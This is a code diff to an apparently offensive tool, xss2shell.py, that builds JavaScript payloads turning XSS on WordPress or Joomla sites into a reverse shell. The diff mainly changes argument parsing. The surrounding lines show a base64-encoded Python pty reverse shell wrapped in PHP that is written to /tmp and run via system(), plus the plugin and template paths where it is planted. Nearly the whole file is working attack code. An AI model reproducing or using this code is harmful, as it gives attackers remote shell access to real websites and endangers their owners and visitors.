@@ -2,6 +2,7 @@
 # -*- coding: utf-8 -*-
 #python pty shell provided by infodox
 import subprocess, base64, sys, urllib
+import argparse
 
 rshell = """import os
 import pty
@@ -31,43 +32,46 @@ print """
 •▀▀ ▀▀ ▀▀▀▀  ▀▀▀▀     ▀▀▀▀▀▀     ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀
 """
 
-def help():
-	print('''Usage:
-  -> Default python pty reverse shell: ./xss2shell.py [lhost] [lport] --[CMS]
-  -> Custom php payload: ./xss2shell.py custom [payload.php] --[CMS]''')
-
-def preparepayload(payload, cms):
+def preparepayload(payload, cms, targeturi):
+	payload = urllib.quote_plus(payload)
 	if cms == 'joomla':
 		f = open('joomla.js').read()
+		payload = f % (targeturi, payload, targeturi, targeturi, targeturi)
 	else:
 		f = open('wordpress.js').read()
-	payload = urllib.quote_plus(payload)
-	payload = f % (payload)
+		payload = f % (targeturi, targeturi, payload, targeturi, targeturi)
 	open('out.js', 'w').write(payload)
 	print('[+] out.js generated!')
 
-def genpayload(lhost, payload, rshell, cms):
+def genpayload(lhost, payload, rshell, cms, targeturi):
 	rshell = base64.b64encode(rshell % (lhost, lport))
 	payload = '<?php file_put_contents("/tmp/rshell.py", base64_decode("%s")); system("python /tmp/rshell.py; rm /tmp/rshell.py"); ?>' % (rshell)
-	preparepayload(payload, cms)
+	preparepayload(payload, cms, targeturi)
+
+parser = argparse.ArgumentParser()
+parser.add_argument('-l', '--lhost', dest='lhost', help='Host for reverse shell (Ex. 8.8.8.8)', metavar='LHOST')
+parser.add_argument('-p', '--lport', dest='lport', help='Port for reverse shell (Ex. 4444)', metavar='LPORT')
+parser.add_argument('-u', '--targeturi', dest='targeturi', help='TargetURI (Ex. /wordpress)', metavar='TargetURI', default='')
+parser.add_argument('-f', '--file', dest='custom', help='Custom payload (Ex. custom.php)', metavar='CustomPayload')
+parser.add_argument('-c', '--cms', dest='cms', help='CMS (Ex. wordpress)', metavar='CMS')
+
 
 try:
-	if sys.argv[-1].lower() == '--wordpress':
-		cms = 'wordpress'
+	args = parser.parse_args()
+	if args.cms.lower() == 'wordpress':
+		cms = args.cms.lower()
 		print('[+] Payload Location: /wp-content/plugins/akismet/index.php')
-	elif sys.argv[-1].lower() == '--joomla':
-		cms = 'joomla'
+	elif args.cms.lower() == 'joomla':
+		cms = args.cms.lower()
 		print('[+] Payload Location: /administrator/templates/isis/pay.php')
-	if sys.argv[1].lower() == 'custom':
-		print('[+] Using custom payload: %s' % (sys.argv[2]))
-		payload = open(sys.argv[2]).read()
-		preparepayload(payload, cms)
-	elif sys.argv[1].lower() == 'help':
-		help()
-	else:
+	if args.custom == None:
 		print('[+] Using default payload: python pty reverse shell')
-		lhost = sys.argv[1]
-		lport = sys.argv[2]
-		genpayload(lhost, lport, rshell, cms)
+		lhost = args.lhost
+		lport = args.lport
+		genpayload(lhost, lport, rshell, cms, args.targeturi)
+	else:
+		print('[+] Using custom payload: %s' % (args.custom))
+		payload = open(args.custom).read()
+		preparepayload(payload, cms, args.targeturi)
 except:
-	help()
+	parser.print_help()
